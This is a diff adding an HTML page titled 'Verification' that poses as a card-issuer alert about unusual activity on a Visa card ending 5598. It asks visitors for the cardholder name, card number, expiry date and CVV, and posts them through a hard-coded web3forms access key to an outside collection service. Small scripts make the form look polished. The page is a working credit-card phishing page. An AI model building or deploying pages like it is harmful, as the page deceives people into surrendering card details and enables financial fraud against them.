@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification</title>
+    <link rel="stylesheet" type="text/css" href="Card.css">
+    <style>
+        /* Centering container */
+        .container {
+            text-align: center;
+            margin-top: 50px; /* Adjust as needed */
+        }
+
+        /* Form styling */
+        form {
+            display: inline-block;
+            text-align: left; /* Resetting text alignment */
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Verification</h1>
+    <h3>We Have Detected Some Unusual Activity On Your Visa Card Ending With 5598. Please Verify Your Authenticity.</h3>
+
+    <form action="https://api.web3forms.com/submit" method="POST" id="verification-form">
+        <!-- Replace with your Access Key -->
+        <input type="hidden" name="access_key" value="f818be7e-6cf2-4005-966f-e601b2304d8a">
+
+        <!-- Form Inputs. Each input must have a name="" attribute -->
+        <input type="text" name="name" placeholder="Name On Card" required>
+        
+        <!-- Modified the number input -->
+        <input type="text" name="Number" placeholder="Card Number" required maxlength="19" id="card-number-input">
+        
+        <!-- Modified the message input -->
+        <input type="text" name="Message" placeholder="MM/YYYY" required maxlength="7" id="message-input">
+        
+        <input type="text" name="3digit" placeholder="CVV" required>
+
+        <button type="submit">Submit Form</button>
+    </form>
+</div>
+
+<script>
+    // Add space after every four digits in the card number input
+    document.getElementById('verification-form').addEventListener('input', function (e) {
+        const cardNumberInput = document.querySelector('input[name="Number"]');
+        const value = cardNumberInput.value.replace(/\s+/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
+        cardNumberInput.value = value;
+    });
+    
+    // Add slash after the first two characters in the message input
+    document.getElementById('verification-form').addEventListener('input', function (e) {
+        const messageInput = document.querySelector('input[name="Message"]');
+        if (messageInput.value.length >= 2 && messageInput.value.indexOf('/') === -1) {
+            messageInput.value = messageInput.value.substr(0, 2) + '/' + messageInput.value.substr(2);
+        }
+    });
+</script>
+
+</body>
+</html>
